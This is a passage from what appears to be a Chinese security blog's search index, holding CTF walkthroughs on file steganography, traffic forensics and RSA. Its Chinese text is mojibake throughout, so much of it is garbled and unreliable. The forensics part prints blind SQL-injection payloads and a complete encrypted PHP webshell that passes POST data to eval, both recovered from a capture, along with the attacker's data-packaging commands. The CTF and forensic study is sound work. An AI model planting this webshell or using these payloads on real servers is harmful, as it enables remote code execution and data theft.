´å·¥å…·ã€‹2020/06/10ã€Šã€ŒFuzzã€:æµ…è°ˆä¸€äº›æ¨¡ç³ŠåŒ¹é…æœé›†ä¿¡æ¯çš„æŠ€å·§ã€‹2021/03/192020/06/8*NEWã€Šã€Œä¿¡æ¯æœé›†ã€:æ¼«è°ˆä¸€äº›åœ¨å†…ç½‘çš„ä¿¡æ¯æœé›†æŠ€å·§ã€‹2020/05/27ã€Šã€ŒDockerã€:usedockerelegant:)ã€‹2020/05/26ã€Šã€ŒStruts2ã€:Apache-Struts2æ¡†æ¶æ¼æ´å¤ç°ã€‹2020/05/20ã€Šã€ŒBASHã€:è°ˆè°ˆå®Œå…¨äº¤äº’å¼çš„ç»ˆç«¯ã€‹2020/05/19ã€Šã€Œfastjsonã€:æµ…è°ˆjsonçš„ååºåˆ—åŒ–ã€‹2020/05/17ã€Šã€ŒDOCKERã€:è°ˆè°ˆdockeré€ƒé€¸é‚£ç‚¹äº‹ã€‹2020/05/15ã€Šã€Œæ¸—é€ã€:SQLæ³¨å…¥æ–°å§¿åŠ¿:)ã€‹2020/05/15ã€Šã€Œå®‰å“ã€:ä½¿ç”¨rootCloakç»•è¿‡rootæƒé™ç›‘æµ‹ã€‹2020/04/27ã€Šã€Œæ¸—é€ã€:ä¸€å¥è¯åå¼¹docker-shellã€‹2020/04/1ã€Šã€ŒTerminalã€:pipæŠ¥é”™'unkown-encoding'ã€‹2020/01/21ã€Šã€Œèµ„äº§æ‰«æã€:Let'sGyoiThon!ã€‹2021/08/262020/01/19*NEWã€ŠMavenæ„å»ºé¡¹ç›®ç›¸å…³ä¸€æ½å­çŸ¥è¯†ã€‹2020/01/7ã€Šã€Œç¬”è®°ã€ï¼šfortify-error-no-rules-file-foundã€‹2022/03/302019/12/31*NEWã€Šã€Œscrcpyã€:Linuxä¸­ä¼˜ç§€çš„æŠ•å±è½¯ä»¶ï½ã€‹2019/12/30ã€Šã€Œç¬”è®°ã€ï¼šåå¼¹shellçš„å‡ ç§æ–¹æ³•ã€‹2022/10/202019/12/25*NEWã€ŠMod-Securityï¼šæœ‰å…³ã€ŒWAFã€çš„çˆ±æ¨æƒ…ä»‡ã€‹2019/12/18ã€Šã€Œå®‰å“æ¸—é€ã€:AmazingdrozerScanningframeã€‹2019/12/15ã€Šã€Œå®‰å“æ¸—é€ã€ï¼šLet'shookAPKwithfridaï½ã€‹2019/12/7ã€ŠNGINXç¬”è®°ï¼šhttpå‡çº§httpsåè®®ã€‹2019/12/4ã€Šã€Œæ’é”™ã€ï¼šphp-fpmè§£æ404-notfoundã€‹2019/11/30ã€Šã€Œå®‰å“æ¸—é€ã€ï¼šå¤©ä¹‹éª„å­ADBã€‹2021/06/272019/11/22*NEWã€Šå¤šå­åŸŸï¼šJEKYLLä¼˜é›…åœ°éƒ¨ç½²äºNGINXã€‹2019/11/21ã€ŠDockerç¯å¢ƒä¸‹T-potèœœç½éƒ¨ç½²è®°å½•ã€‹2019/11/18ã€Šã€Œç¬”è®°ã€ï¼šJekyllforlinux.æœåŠ¡å™¨éƒ¨ç½²å†ç¨‹ã€‹2019/09/1ã€Šã€Œç§»æ¤ã€UbuntuWithArmå…¬ç½‘å­˜å‚¨å®¹å™¨æ­å»ºè®°å½•ã€‹2019/09/1ã€Šã€ŒFINDOMAINã€ï¼šè·¨å¹³å°å­åŸŸåæœé›†å·¥å…·ã€‹2019/09/1ã€Šã€Œæ¸—é€ã€SVGçš„ç¥ç§˜åŠ›é‡ï¼šminUv2ã€‹2019/07/15ã€Šã€Œæ¸—é€ã€:PumpkinRaising-å¯†ç å­¦çš„å¥¥ä¹‰ã€‹Others...palintext:codehline."
  },

  {
    "title"    : "CTF - æ‚é¡¹",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CTF-Misc-WalkThrough/",
    "date"     : "Jul 29, 2021",
    "content"  : "é›¶ï¼šMiscæ–‡ä»¶éšå†™#0x00æ ¼å¼æ–‡ä»¶å‚è€ƒæ–‡ä»¶æ ¼å¼/å¤´å°¾å€¼RARArchive(rar)/æ–‡ä»¶å¤´ï¼š52617221Wave(wav)/æ–‡ä»¶å¤´ï¼š57415645JPEG(jpg)/æ–‡ä»¶å¤´ï¼šFFD8FFPNG(png)/æ–‡ä»¶å¤´ï¼š89504E47æ–‡ä»¶å°¾ï¼š0000000049454E44AE426082GIF(gif)/æ–‡ä»¶å¤´ï¼š47494638ZIPArchive(zip)/æ–‡ä»¶å¤´ï¼š504B0304æ–‡ä»¶å°¾ï¼š00000000TIFF(tif)/æ–‡ä»¶å¤´ï¼š49492A00WindowsBitmap(bmp)/æ–‡ä»¶å¤´ï¼š424DCAD(dwg)/æ–‡ä»¶å¤´ï¼š41433130AdobePhotoshop(psd)/æ–‡ä»¶å¤´ï¼š38425053RichTextFormat(rtf)/æ–‡ä»¶å¤´ï¼š7B5C727466XML(xml)/æ–‡ä»¶å¤´ï¼š3C3F786D6CHTML(html)/æ–‡ä»¶å¤´ï¼š68746D6C3EEmailthoroughonly-(eml)/æ–‡ä»¶å¤´ï¼š44656C69766572792D646174653AOutlookExpress(dbx)/æ–‡ä»¶å¤´ï¼šCFAD12FEC5FD746FOutlook(pst)/æ–‡ä»¶å¤´ï¼š2142444EMSWord/Excel(xls.or.doc)/æ–‡ä»¶å¤´ï¼šD0CF11E0MSAccess(mdb)/æ–‡ä»¶å¤´ï¼š5374616E64617264204AWordPerfect(wpd)/æ–‡ä»¶å¤´ï¼šFF575043AdobeAcrobat(pdf)/æ–‡ä»¶å¤´ï¼š255044462D312EQuicken(qdf)/æ–‡ä»¶å¤´ï¼šAC9EBD8FWindowsPassword(pwl)/æ–‡ä»¶å¤´ï¼šE3828596AVI(avi)/æ–‡ä»¶å¤´ï¼š41564920RealAudio(ram)/æ–‡ä»¶å¤´ï¼š2E7261FDRealMedia(rm)/æ–‡ä»¶å¤´ï¼š2E524D46MPEG(mpg)/æ–‡ä»¶å¤´ï¼š000001BAMPEG(mpg)/æ–‡ä»¶å¤´ï¼š000001B3Quicktime(mov)/æ–‡ä»¶å¤´ï¼š6D6F6F76WindowsMedia(asf)/æ–‡ä»¶å¤´ï¼š3026B2758E66CF11MIDI(mid)/æ–‡ä»¶å¤´ï¼š4D546864#0x01å›¾ç‰‡éšå†™é¢˜ç›®1ï¼šwordçš„æœ¬è´¨æ ¹æ®é¢˜ç›®æ ‡é¢˜å’Œé™„ä»¶ï¼ŒçŒœæµ‹å¯èƒ½å’Œwordæ–‡ä»¶æ ¼å¼çš„åç¼€ç›¸å…³ï¼›ç»™å‡ºçš„æ–‡ä»¶æ˜¯wordçš„æœ¬è´¨çš„é™„ä»¶.docxç»™å‡ºä¸€ä»½wordæ–‡æ¡£å¯ä»¥æ‰“å¼€ï¼Œå†…å®¹å¦‚ä¸‹ï¼šè€è§„çŸ©ï¼ŒbinwalkæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶âœbinwalkwordçš„æœ¬è´¨çš„é™„ä»¶.docxDECIMALHEXADECIMALDESCRIPTION--------------------------------------------------------------------------------00x0Ziparchivedata,atleastv1.0toextract,name:_rels/Â·Â·Â·81390x1FCBZiparchivedata,atleastv1.0toextract,compressedsize:31149,uncompressedsize:31149,name:word/media/image1.jpg393390x99ABZiparchivedata,atleastv1.0toextract,compressedsize:19960,uncompressedsize:19960,name:word/media/image2.pngÂ·Â·Â·1054650x19BF9EndofZiparchive,footerlength:22çœ‹åˆ°æ˜¯zipæ–‡ä»¶ï¼Œç›´æ¥âœmvwordçš„æœ¬è´¨çš„é™„ä»¶.docxwordçš„æœ¬è´¨çš„é™„ä»¶.zipï¼Œç„¶åè§£å‹å¾—åˆ°flagï¼›image1.jpgæ˜¯ä¸Šé¢æ–‡æ¡£ä¸­çš„å›¾ç‰‡ï¼šé¢˜ç›®2ï¼šç®€å•çš„å›¾ç‰‡ç®€å•çš„å›¾ç‰‡çš„é™„ä»¶.zipâœbinwalkç®€å•çš„å›¾ç‰‡çš„é™„ä»¶.zipDECIMALHEXADECIMALDESCRIPTION--------------------------------------------------------------------------------00x0Ziparchivedata,atleastv2.0toextract,compressedsize:1214015,uncompressedsize:1226323,name:2.png12140500x128662Ziparchivedata,atleastv2.0toextract,compressedsize:1008239,uncompressedsize:1008124,name:1.png22224980x21E9A2EndofZiparchive,footerlength:22zipå‹ç¼©åŒ…å¯ä»¥ç›´æ¥è§£å‹å‡ºä¸¤å¼ çœ‹èµ·æ¥ä¸€æ‘¸ä¸€æ ·çš„å›¾ç‰‡ï¼›åŒæ ·çš„ï¼šä½¿ç”¨binwalkåˆ†åˆ«æŸ¥çœ‹ä¸€ä¸‹ä¸¤å¼ å›¾ç‰‡ï¼šâœbinwalk1.pngDECIMALHEXADECIMALDESCRIPTION--------------------------------------------------------------------------------00x0PNGimage,1080x720,8-bit/colorRGB,non-interlaced1790xB3Zlibcompresseddata,bestcompression3100640x4BB30MySQLMISAMcompresseddatafileVersion11âœbinwalk2.pngDECIMALHEXADECIMALDESCRIPTION--------------------------------------------------------------------------------00x0PNGimage,1080x720,8-bit/colorRGB,non-interlacedæ³¨æ„åˆ°MySQLMISAMcompresseddatafileVersion11è¿™ä¸€æ®µï¼Œä¸çŸ¥é“æ˜¯å•¥ï¼Œå…¨éƒ¨æå–å‡ºæ¥åº·åº·ï¼šâœbinwalk--dd=\".*\"1.pngâœlltotal9880drwxr-xr-x6bin4xinstaff19281910:01./drwx------8bin4xinstaff25681909:49../-rw-r--r--1bin4xinstaff100812481909:490-rw-r--r--@1bin4xinstaff69806081909:494BB30-rw-r--r--1bin4xinstaff233352081909:49B3-rw-r--r--1bin4xinstaff100794581909:49B3.zlibâœfile4BB304BB30:MySQLMyISAMindexfileVersion11,50404keyparts,19163uniquekeyparts,111keys,1846990095656532900records,1063746735895758743deletedrecordsæŸ¥äº†æŸ¥èµ„æ–™æ˜¯Mysqlçš„å­˜å‚¨æ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦ä¸‰ä¸ªå•ç‹¬(.FRM/.MYD/.MYI)çš„æ–‡ä»¶æ‰èƒ½æŸ¥çœ‹mysqlçš„æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬åªæœ‰.MYIçš„æ–‡ä»¶ã€‚ç„¶åå°±è¿™æ ·ä¸€ç›´å¡ç€ï¼›ç›´åˆ°çœ‹äº†è§£é¢˜æ€è·¯ï¼šç›²æ°´å°è§£é¢˜å·¥å…·BlindWaterMarkå®æµ‹ä¸¤å¼ å›¾ç‰‡è°ƒæ•´é¡ºåºä¸ä¼šå½±å“æœ€ç»ˆç»“æœï¼š$pythonbwm.pydecode2.png1.pngResult-1.png$pythonbwm.pydecode1.png2.pngResult-2.pngæ‰€ä»¥ï¼Œå¦‚æœé‡åˆ°ä¸¤å¼ ç›¸åŒçš„å›¾çš„é¢˜ç›®æ²¡æœ‰æ€è·¯ï¼Œå¯ä»¥å¾€ç›²æ°´å°è€ƒç‚¹ä¸Šæ¥é é ã€‚é¢˜ç›®3ï¼šç®€å•éšå†™ï¼Œç»™å‡ºçš„æ˜¯ä¸€å¼ pngå›¾ç‰‡ï¼šç®€å•éšå†™çš„é™„ä»¶.pngTips:æœ€è¿‘åšå…¶ä»–é¢˜ç›®æ€è·¯é¡ºæ‰‹çœ‹äº†ä¸€ä¸‹å‘ç°urlä¸å­˜åœ¨ï¼Œåº”è¯¥æ˜¯å½“æ—¶æ²¡ä¼ ä¸Šå»ï¼›æ‰¾åˆ°æ–‡ä»¶é™„ä»¶åœ¨ä¿®æ”¹é“¾æ¥æ‰“å¼€æ˜¯ä¸€å¼ ç©ºç™½çš„å›¾ç‰‡ï¼Œé«˜å®½1195x1195#0x02éŸ³é¢‘éšå†™é¢˜ç›®ï¼šå»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢é¢˜è§£ï¼›ä½¿ç”¨Audacityå‡æ…¢æ’­æ”¾é€Ÿåº¦å³å¯ã€‚æµé‡åˆ†æï¼ˆ.pacpï¼‰é¢˜#0x03SQLæ³¨å…¥æ”»å‡»timu.pcapngæ‰“å¼€æ˜¾ç¤ºä¸ºæ³¨å…¥payloadid=1'andascii(substr((selectflagfromt),1,1))=33--ï¼Œæ˜¯ä½¿ç”¨äºŒåˆ†æ³•åˆ¤æ–­SQLè¯­å¥æ‰§è¡Œå¯¹åº”çš„Asciiå­—ç¬¦æ˜¯å¦ç›¸ç­‰ï¼šæ‰€ä»¥ç›´æ¥æ¥çœ‹ä¸€ä¸‹è¿”å›åŒ…çš„é¡µé¢æ˜¯å¦æœ‰ä¸åŒçš„åœ°æ–¹ï¼šAnalyze-&gt;Follow-&gt;TCP/HTTPStreamä¸¤è¾¹ä¸åŒæ˜¾ç¤ºï¼šå·¦è¾¹ä¸ºé”™è¯¯Asciiï¼Œå³è¾¹ä¸ºæ­£ç¡®çš„Asciiï¼ŒæŒ‰ç…§é¡ºåº(substr((selectflagfromt),1,1)-&gt;(n,1)å¾—åˆ°ï¼šGET/ctf/Less-5/?id=1'andascii(substr((selectflagfromt),1,1))=102--HTTP/1.1GET/ctf/Less-5/?id=1'andascii(substr((selectflagfromt),2,1))=108--HTTP/1.1GET/ctf/Less-5/?id=1'andascii(substr((selectflagfromt),3,1))=97--HTTP/1.1GET/ctf/Less-5/?id=1'andascii(substr((selectflagfromt),4,1))=103--HTTP/1.1Â·Â·Â·æŸ¥ä¸€ä¸‹Asciiå­—æ¯è¡¨å¾—åˆ°flagï¼š1021089710312311949114101115104658275951011229549115110116105116125#-&gt;flag{w1reshARK_ez_1snt}#0x04[â€¦]usbæµé‡åˆ†æ[â€¦]#0x05å–è¯/æ”»å‡»è¡Œä¸ºæ— é¢˜ç›®æè¿°ï¼›ç»™å‡ºçš„æ˜¯ä¸€ä»½æµé‡æ–‡ä»¶ï¼šbackdoor.pcapngæ‰“å¼€ä¸€çœ‹æ˜ å…¥çœ¼å¸˜çš„æ˜¯ä¸€ç³»åˆ—SQLæ³¨å…¥çš„payloadï¼šFile-&gt;ExportObjects-&gt;HTTPå¯¼å‡ºå‡ ä¸ªå‡ºæ¥çœ‹çœ‹ï¼Œå¾—åˆ°ä¸€äº›æ•°æ®åº“çš„ä¿¡æ¯ï¼šå¾€ä¸‹å°±æ˜¯Login.phpPOSTåŒ…ç™»å½•æˆåŠŸçš„ä¿¡æ¯ï¼šPOST/login.phpHTTP/1.1Â·Â·Â·username=admin&amp;password=mysql&amp;button=SIGN-INHTTP/1.1302FoundLocation:./admin/index.phpæ¥ç€å¾€ä¸‹ï¼Œè·å–åˆ°äº†ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæµé‡æ˜¾ç¤ºUpload.phpPostä¸Šä¼ æˆåŠŸäº†ä¸€ä¸ªphpé©¬ï¼š&lt;?phpsession_start();@set_time_limit(0);\t@error_reporting(0);functionE($D,$K){for($i=0;$i&lt;strlen($D);$i++){$D[$i]=$D[$i]^$K[$i+1&amp;15];}#Eå‡½æ•°ä¸ºå¼‚æˆ–åŠ å¯†return$D;}functionQ($D){returnbase64_encode($D);}#Qå‡½æ•°ä¸ºbase64ç¼–ç functionO($D){returnbase64_decode($D);}#Oå‡½æ•°ä¸ºbase64è§£ç $P='pass';#æœ¨é©¬è¿æ¥å‚æ•°$V='payload';#æ‰§è¡Œè½½è·$T='3c6e0b8a9c15224a';#åŠ å¯†å¯†é’¥if(isset($_POST[$P])){$F=O(E(O($_POST[$P]),$T));if(isset($_SESSION[$V])){$L=$_SESSION[$V];$A=explode('|',$L);classC{publicfunctionnvoke($p){eval($p.\"\");}}$R=newC();\t\t\t$R-&gt;nvoke($A[0]);echosubstr(md5($P.$T),0,16);echoQ(E(@run($F),$T));echosubstr(md5($P.$T),16);}else{$_SESSION[$V]=$F;}}#/upload/1615384904.phpä¸Šä¼ æˆåŠŸï¼Œä¸º1615384904.phpé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å…³æ³¨1615384904.phpæ”»å‡»è€…æ“ä½œæœ¨é©¬è¿›è¡Œäº†å“ªäº›æ“ä½œå°±å¥½ï¼›å…¨éƒ¨å¯¼å‡ºï¼Œæ“ä½œæµé‡å…¨åŠ å¯†ç±»ä¼¼è¯·æ±‚POSTï¼špass=OgRUWzZ%2FDUw5ZQRbYXFQfylbVFwGfwlPOXQAWlBjNAo0Wg1fAH4KTjdfb1tkTidcOltUYjJpXAQ%3Dè¿”å›ï¼š11cd6a8758984163LmIwSi9SBgguZXwBfFkRSQEEUXsvbDRDLltSA39gKAYtdVBHA3Agci5lYEh/XgYCLmIoSCxRVE4CeXR5f2A4Sy1iKAQsfApOLXIARVN8IHg=6c37ac826a2a04bcæŸ¥çœ‹ä»£ç é€»è¾‘ï¼špostä¼ å…¥å‚æ•°pass-&gt;$Tå¯†é’¥åŠ å¯†-&gt;$Vä¼ å…¥classCè¿›è€Œä¼ å…¥evalå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸‹ä¸€æ­¥éœ€è¦åšçš„æ˜¯ç ´è§£æœ¨é©¬çš„åŠ å¯†æ–¹å¼ï¼Œè§£å¯†ä»£ç è§£å¾—ä¸Šé¢çš„POSTè¯·æ±‚ä¸ºï¼šè¿”å›ï¼š#cmdLine=bHMK&amp;methodName=ZXhlY0NvbW1hbmQ=-&gt;base64decode-&gt;cmdLine=ls&amp;methodName=execCommand1532851276json1532851294.php1532851316.php1615384904.phpè¿›ä¸€æ­¥åˆ†æå¾—åˆ°å¤‡ä»½å‘½ä»¤ï¼šcmdLine=zipwww.zip-rP$APACHE_RUN_USER/var/www/html/&amp;methodName=execCommandä»æµé‡æ–‡ä»¶ä¸­æ‰¾åˆ°www.zipå¯¼å‡ºï¼Œè§£å‹å¯†ç æ˜¯$APACHE_RUN_USERä¹Ÿæ˜¯ä»æµé‡ä¸­æ‰§è¡Œenvå‘½ä»¤cmdLine=ZW52Cg==&amp;methodName=ZXhlY0NvbW1hbmQ=è§£å¯†å¾—åˆ°ï¼šAPACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAPACHE_LOCK_DIR=/var/lock/apache2LANG=CAPACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2PWD=/app/admin/uploadæ‰€ä»¥å¯†ç å°±æ˜¯www-dataï¼Œç„¶åæ ¹æ®httpæµé‡åŒ…æŠŠzipæ–‡ä»¶è§£å‹å‡ºæ¥ï¼Œæˆ‘ä»¬æ‰¾åˆ°ä¸‹è½½zipæ–‡ä»¶æµé‡åŒ…çš„ååŒ…ï¼šé€‰æ‹©ååŒ…-&gt;æ–‡ä»¶-&gt;ExportpacketBytes/å¯¼å‡ºæ•°æ®åŒ…å­—èŠ‚æµè§£å‹zipæ–‡ä»¶ï¼Œhtmlç›®å½•ä¸‹phpä»£ç å‘ç°flag.phpï¼š&lt;?php$enc='aes-128-ecb';$flag='CN1Sq9tFItxZhsu3zCWbrdf6ozOL4eoKG0s71vGg/AKKnch3IL3jzwtXeCgWK5QP';?&gt;è§‚å¯Ÿç›®å½•ä¸‹å‘ç°å­˜åœ¨è¢«ä¿®æ”¹çš„phpä»£ç ï¼šï¼ˆä»¥ä¸‹ä¸ºå‚è€ƒæ•™ç¨‹ç»™å‡º-ã€‚-ï¼‰ä½¿ç”¨ååŠ çš„ä»£ç å¯¹ç©ºç™½å­—ç¬¦è¿›è¡Œè§£ç ï¼Œå¹¶file_put_contents('tmp2.txt',base64_decode($out));è¾“å‡ºåˆ°tmp2.txtæ–‡ä»¶ä¸­ï¼ŒåŒæ ·æ–‡ä»¶ä¸­è¾“å‡ºä¹Ÿæœ‰ç©ºç™½å­—ç¬¦ï¼Œå†æ¬¡è§£ç å³å¯ï¼›è§£ç ä»£ç ä½¿ç”¨è·å¾—çš„keyåœ¨çº¿è§£å¯†aes-128-ecbç®—æ³•ï¼Œå¾—åˆ°flagï¼šDASCTF{d8f191d0f0be0f039c4ededb7839218e}#0x06[â€¦]ä¸Šä¼ /ä¸‹è½½æ–‡ä»¶[â€¦]"
  },

  {
    "title"    : "CTF - å¯†ç å­¦ä¸æ‚é¡¹",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CTF-Crypto-and-Misc-etc-WalkThrough/",
    "date"     : "Jul 29, 2021",
    "content"  : "é›¶ï¼šCryptoRSAé¢˜å‹Tipsï¼šRSAåŠ è§£å¯†çš„ç®—æ³•å®Œå…¨ç›¸åŒï¼Œå…¬é’¥åŠ å¯†ä½“åˆ¶ä¸­ï¼Œä¸€èˆ¬ç”¨å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†ï¼Œè®¾cä¸ºæ˜æ–‡ï¼Œmä¸ºå¯†æ–‡ï¼›å…¬å¼å¦‚ä¸‹ï¼š\\[câ‰¡m^emod\\quadn\\\\mâ‰¡c^dmod\\quadn\\]RSAçš„ç®—æ³•æ¶‰åŠä¸‰ä¸ªå‚æ•°ï¼Œnã€eã€dï¼šnæ˜¯ä¸¤ä¸ªå¤§è´¨æ•°pã€qçš„ç§¯ï¼Œnçš„äºŒè¿›åˆ¶è¡¨ç¤ºæ‰€å ç”¨çš„ä½æ•°ï¼Œå°±æ˜¯æ‰€è°“çš„å¯†é’¥é•¿åº¦ï¼›eå’Œdæ˜¯ä¸€å¯¹ç›¸å…³çš„å€¼ï¼Œeå¯ä»¥ä»»æ„å–ï¼Œä½†è¦æ±‚eä¸(p-1)(q-1)äº’è´¨ï¼Œå†é€‰æ‹©dï¼›å…¶ä¸­ï¼Œpã€qä¸ºè´¨æ•°ï¼Œnã€eã€dè®¡ç®—å¦‚ä¸‹ï¼š\\[n=p*q\\]\\[Ã¸(n)=(p-1)*(q-1)\\]\\[edâ‰¡1\\mod\\Ã¸(n)\\]ï¼ˆnï¼Œe),(nï¼Œd)å°±æ˜¯å¯†é’¥å¯¹ã€‚å…¶ä¸­(nï¼Œe)ä¸ºå…¬é’¥ï¼Œ(nï¼Œd)ä¸ºç§é’¥ã€‚#0x01å…¬é’¥åŠ å¯†æ–‡é¢˜å¹²ï¼šç»™å‡ºå…¬é’¥æ–‡ä»¶ï¼š.pem/.pubåç¼€æ–‡ä»¶ã€å¯†æ–‡ï¼š.encä¹‹ç±»åç¼€çš„æ–‡ä»¶ï¼›ä¾‹é¢˜1ä¾‹é¢˜2è§£æ³•ï¼šåˆ†æpem/pubæ–‡ä»¶æ¢å¤ç§é’¥ï¼Œé€šè¿‡ç§é’¥å¯¹encæ–‡ä»¶è¿›è¡Œè§£å¯†å¾—åˆ°flagï¼›ä¾‹é¢˜1æ–‡ä»¶å¦‚ä¸‹ï¼šâœll-rw-r--r--@1bin4xinstaff324292016flag.enc-rw-r--r--@1bin4xinstaff1384292016pubkey.pemâœfileflag.encflag.enc:dataâœfilepubkey.pempubkey.pem:ASCIItextâœcatpubkey.pem-----BEGINPUBLICKEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----ENDPUBLICKEY-----è§£(3summer/CTF-RSA-tool)ï¼šsolve.py--verbose-kpubkey.pem--decryptflag.enc`åŒæ ·çš„ï¼šä¾‹é¢˜2ç±»ä¼¼ï¼š$rsatools--publickeypublic.pem--uncipherfileflag.encprivateargumentisnotset,theprivatekeywillnotbedisplayed,evenifrecovered.[*]Testingkeypublic.pem.[*]Performingpastctfprimesattackonpublic.pem.90%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Œ/102/113[00:00&lt;00:00,1445.70it/s][*]Attacksuccesswithpastctfprimesmethod!Resultsforpublic.pem:Unciphereddata:HEX:0x61666374667b5235345f7c355f24305f423072696e397dINT(bigendian):9329062300443879711046737916988523093598680555377801597INT(littleendian):11994109012077315504651226639166102749077267728721733217utf-8:afctf{R54_|5_$0_B0rin9}STR:b'afctf{R54_|5_$0_B0rin9}'Â·Â·Â·#0x02æ–‡æœ¬èµ›é¢˜ç»™å‡ºä¸€æ®µæ–‡æœ¬ï¼Œä¸»è¦è€ƒå¯ŸRSAå…¬å¼çš„ç”¨æ³•ï¼Œè€ƒè™‘å·²çŸ¥å˜é‡ï¼Œä½¿ç”¨ä»€ä¹ˆæ”»å‡»æ‰‹æ³•ï¼›é¢˜å¹²ï¼šåœ¨ä¸€æ¬¡RSAå¯†é’¥å¯¹ç”Ÿæˆä¸­ï¼Œå‡è®¾p=473398607161ï¼Œq=4511491ï¼Œe=17ï¼Œæ±‚è§£å‡ºdç›´æ¥ç”¨åé¢ä¸‰ä¸ªå…¬å¼ï¼š\\[n=pq=473398607161*4511491\\\\Ã¸(n)=(473398607161-1)*(4511491-1)\\\\17*dâ‰¡1\\mod\\Ã¸(n)\\]ä¹Ÿå°±æ˜¯ï¼š\\[\\frac{17d-1}{Ã¸(n)}=int()=\\frac{17d-1}{2135733082216268400}\\\\d=\\frac{2135733082216268401}{17}=125631357777427553\\]åŒæ ·ä¹Ÿå¯ä»¥é€šè¿‡rsatoolsæ¥è§£ï¼šâœln-s/{path/to}/CTF-RSA-tool/solve.py/usr/local/bin/rsatoolsâœrsatools--verbose--private-N2135733555619387051-e17-p473398607161-q4511491#0x03æµé‡ï¼ˆ.pcapï¼‰æ–‡ä»¶æœ‰æ—¶å‡ºé¢˜äººä¼šç»™ä½ ä¸€ä¸ªæµé‡åŒ…ï¼Œä½ éœ€è¦ç”¨wiresharkç­‰å·¥å…·åˆ†æï¼Œç„¶åæ ¹æ®æµé‡åŒ…çš„é€šä¿¡ä¿¡æ¯ï¼Œåˆ†æé¢˜ç›®è€ƒå¯Ÿçš„æ”»å‡»æ–¹æ³•ï¼Œä½ å¯ä»¥æå–å‡ºæ‰€æœ‰ä½ è§£é¢˜éœ€è¦ç”¨åˆ°çš„å‚æ•°ï¼Œç„¶åè¿›è¡Œè§£å¯†ä¸¾ä¾‹é¢˜ç›®æš‚æ—¶æ²¡æœ‰é‡åˆ°ï¼Œæœ‰çš„è¯ä¼šè¡¥ä¸Š[â€¦]#0x04æœ¬åœ°è„šæœ¬åˆ†æé¢˜ç›®ä¼šç»™ä½ ä¸€ä¸ªè„šæœ¬å’Œä¸€æ®µå¯†æ–‡ï¼Œä¸€èˆ¬ä¸ºpythonç¼–å†™ï¼Œä½ éœ€è¦é€†å‘æ–‡ä»¶æµç¨‹ï¼Œåˆ†æè„šæœ¬çš„åŠ å¯†è¿‡ç¨‹ï¼Œå†™å‡ºå¯¹åº”çš„è§£å¯†è„šæœ¬è¿›è¡Œè§£å¯†fromCrypto.Util.numberimport*importbinasciiimportgmpy2flag='*****************************************'hex_flag=int(flag.encode(\"hex\"),16)p=getPrime(256)q=getPrime(256)n=p*qe=0x3c1=pow(hex_flag,e,n)c2=pow(hex_flag+1,e,n)print(\"n=\",hex(n))print(\"e=\",hex(e))print(\"c1=\",hex(c1))print(\"c2=\",hex(c2))#('n=','0xb28ae8f29f8b90e8b8c5667b2b71e49929446b41f7f7a3e9e45bc52a1e8c45d59c1788be48a9c365d51feee0b2cd3295001cdad1ba5ccf808686b5ce5a269ae5L')#('e=','0x3')#('c1=','0x7ba5502ecbc3b15ad8c2db8f30a593eb062dde4d7dfacadf0a28291d1a576389a18dfba0607c0243f843f637449089dd2090d47ee9845d4147f02afd4d891f19L')#('c2=','0x891ac4f663df41c1f6433ee3513d749c3ba02fe0aacd7f51d791b9bac4f7e5194bd484d78d972c344faf600f7d3aa580485774768efc47ab8ddb67eeeb330fa1L')å¦‚ä¸Šæ‰€ç¤ºï¼Œå·²çŸ¥nã€eã€c1ã€c2å’Œã€c2çš„è¡¨è¾¾å¼ï¼›æˆ‘ä»¬å¯ä»¥æ±‚å‡ºhex_flagçš„å€¼ï¼š\\[\\left\\{\\begin{aligned}c1â‰¡hexflag^3&amp;(mod\\quadn)\\\\c2â‰¡(hexflag+1)^3&amp;(mod\\quadn)\\\\\\end{aligned}\\right.\\]Tipsï¼šè¿™é‡Œpow(a,b,c)çš„æ„æ€å°±æ˜¯å–æ¨¡ï¼Œä¸ºï¼š\\[pow(a,b,c)=a^bmod\\quadc\\\\eg:7^1mod\\3=1\\]&gt;&gt;&gt;a=7&gt;&gt;&gt;b=1&gt;&gt;&gt;c=3&gt;&gt;&gt;n=pow(a,b,c)&gt;&gt;&gt;printnçœ‹èµ·æ¥å¾ˆç®€å•ï¼ŒæŠŠhex_flagç®—å‡ºæ¥è‡ªç„¶flagå°±å‡ºæ¥äº†ï¼Œä½†æ˜¯å®é™…ä¸Šæˆ‘ä»¬éœ€è¦åšçš„æ˜¯æŠŠä¸Šé¢çš„æ•°å­¦å…¬å¼è¾“å‡ºæˆä»£ç ï¼Œå› 